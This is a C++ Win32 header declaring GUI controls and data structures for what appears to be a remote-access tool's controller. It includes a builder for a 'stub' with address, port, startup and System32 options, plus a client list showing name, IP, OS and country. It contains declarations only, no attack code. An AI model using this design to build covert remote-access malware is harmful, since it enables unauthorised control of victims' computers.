#pragma once
#include "Resource.h"
#define CS_EXIT		1 << 0
#define CS_MINI		1 << 1
#define CS_MAXI		1 << 2
#define CS_TAB		1 << 3
#define CS_RECORD	1 << 4
namespace Theme {
	

	extern int SCREEN_WIDTH;
	extern int SCREEN_HEIGHT;

	RECT DrawTextC(RECT, HDC, LPCWSTR, int, BOOL);
	RECT GetRect(HWND hWnd);

	

	HWND CWindow(RECT, LPCWSTR, LPCTSTR lpClassName, LPCTSTR lpWindowName, DWORD dwStyle, int x, int y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu);

	HANDLE CreateCFont(RECT, LPCWSTR);

	ATOM RClass(UINT style, WNDPROC wP, HINSTANCE hInstance, HCURSOR hCur, HICON hIcon, HBRUSH hbBG, LPCWSTR menuName, LPCWSTR ClassName, int size);
	LRESULT CALLBACK buttonProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
	LRESULT CALLBACK editProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
	LRESULT CALLBACK __stdcall ListViewButtonProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);

	void DrawEdge(HDC, RECT&);

	struct Settings {
		struct Data {
			WCHAR Port[99];
			BOOL Applied, MTT, change;
		}data;
		struct Handles {
			HWND Port, MinimizeToTray, Apply, Cancel, OK, parent;
		}HWND;
	};

	struct Build {
		struct Data {
			WCHAR Address[99], Port[99], StubName[99];
			BOOL Startup, Sys32, Applied;
		}data;
		struct Handles {
			HWND Parent, Address, Port, StubName,
				Startup, Sys32, Build, Exit;
		}HWND;
	};
	struct ControlData { //TODO separate to differentiate between Button and Edit controls
		DWORD dwStyle;
		HWND hWnd, hFocus, parent;
		RECT csize, TxtDem;
		WCHAR OGT[99], Text[99];
		int len, hMenu;
		BOOL FOCUS, BMT, ShiftState, HighLight;
		HANDLE font;
	};
	struct MainData
	{
		BOOL Start,Build;
		Build::Data bData;
		Settings::Data sData;
		LPVOID Winsock;
		struct Handles {
			HWND Sort, ListView, Active, Start, BuildB, BuildW,
				SettingsB, SettingsW, Name, IP, OpSys, Country, Add, rhWnd;
		}HWND;
	};

	struct ListViewButton {
		BOOL Pinned = FALSE;
		int ButtonNumber;
		ControlData* pData;
		ClientData cData;
		~ListViewButton() { DestroyWindow(pData->hWnd); }
	};

	struct ListView {

		int counter, ButtonHeight, ButtonWidth, ControlHeight, Style, max, numOfPinned;
		BOOL VSCROLL;
		std::vector<ListViewButton*> vLVButton;
		std::vector<ClientData> vClientData;
	};
	typedef struct MainData MData;
	typedef struct ControlData CData;
};

